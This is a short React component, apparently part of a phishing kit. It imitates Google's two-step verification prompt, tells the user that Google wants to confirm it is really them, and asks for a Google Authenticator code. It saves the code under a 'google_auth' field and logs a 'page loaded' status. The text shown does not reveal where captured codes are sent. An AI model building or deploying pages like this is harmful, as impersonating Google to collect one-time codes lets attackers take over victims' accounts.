import React from "react";
import GoogleCodeChallenge from "./GoogleCodeChallenge";

function GoogleAuth(props) {
  return (
    <GoogleCodeChallenge
      {...props}
      componentName="Google Auth App 2FA"
      initialMessage="Google Authenticator 2FA Page Loaded"
      dataField="google_auth"
      description={
        <>
          To help keep your account safe, Google wants to make sure it&rsquo;s
          really you trying to sign in.
          <br />
          <br />
          Get a verification code from the <strong>Google Authenticator</strong>{" "}
          app.
        </>
      }
    />
  );
}

export default GoogleAuth;
